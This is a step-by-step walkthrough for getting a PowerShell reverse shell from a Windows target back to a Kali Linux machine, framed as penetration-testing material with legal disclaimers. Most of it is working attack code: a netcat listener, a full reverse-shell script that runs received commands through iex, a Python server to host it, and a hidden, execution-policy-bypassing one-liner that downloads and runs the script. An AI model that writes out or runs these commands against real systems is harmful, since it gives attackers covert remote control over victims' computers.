# PowerShell Reverse Shell Walkthrough

## Overview

This guide will walk you through the process of setting up a **PowerShell Reverse Shell** to connect from a target Windows machine back to your Kali Linux machine. The reverse shell allows you to remotely execute commands on the target machine after it connects back to your attacker's machine.

This walkthrough also includes steps to encode the PowerShell reverse shell command to evade basic detection mechanisms during testing.

### Important Disclaimer

**Warning:** This tool is intended for ethical penetration testing and security assessments only. Unauthorized access to systems or networks without permission is illegal and unethical. Always obtain explicit written permission before testing or exploiting any systems.

---

## Prerequisites

### **Attacker Machine (Kali Linux)**:
- **Netcat** or similar tool to listen for the reverse shell connection.
- **Python 3** for hosting the reverse shell script.

### **Target Machine (Windows)**:
- **PowerShell** should be available (on most modern Windows machines).

---

## Walkthrough

### **Step 1: Set Up the Listener on Kali**

The first step is to set up a listener on your Kali machine to receive the incoming reverse shell connection. Open a terminal and run the following command:

```bash
nc -lvnp <port>
```

- Replace `<port>` with the port you want to listen on (e.g., `4444`). Ensure that this port is open and accessible from the target machine.

---

### **Step 2: Prepare the Reverse Shell Script**

Create the reverse shell PowerShell script that will be executed on the target machine. Save the following script as `reverse.ps1` on your Kali machine (e.g., `/var/www/html/reverse.ps1`):

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<kali_ip>', <port>);
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535 | % { 0 };
while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

- Replace `<kali_ip>` with your Kali machine's IP address.
- Replace `<port>` with the same port number you are using for the listener (e.g., `4444`).

---

### **Step 3: Start a Simple HTTP Server on Kali**

Use Python's built-in HTTP server to host the `reverse.ps1` script and make it accessible to the target machine. Run the following command on Kali:

```bash
python3 -m http.server 80
```

This will start an HTTP server on port `80` and serve files from the current directory. Make sure the `reverse.ps1` script is in the directory being served (e.g., `/var/www/html/`).

You can now access your script from the target machine using your Kali machine's IP address:

```
http://<kali_ip>/reverse.ps1
```

---

### **Step 4: Run the PowerShell Command on the Target Machine**

On the target machine (the Windows machine), open a PowerShell window and run the following command to download and execute the reverse shell script:

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/reverse.ps1')"
```

- Replace `<kali_ip>` with your Kali machine’s IP address.

This command performs the following actions:
1. `-NoP`: Disables PowerShell profile.
2. `-NonI`: Disables interactive mode.
3. `-W Hidden`: Runs PowerShell in hidden window mode.
4. `-Exec Bypass`: Bypasses the execution policy, allowing unsigned scripts to run.
5. `IEX`: Executes the downloaded PowerShell script.

Once this command is executed, the target machine will connect back to your Kali machine's listener, providing you with a command prompt on the target system.

## Legal Disclaimer

This tool is intended for use in authorized security assessments only. Unauthorized access to computer systems is illegal. Always obtain explicit written permission before testing or exploiting any system.
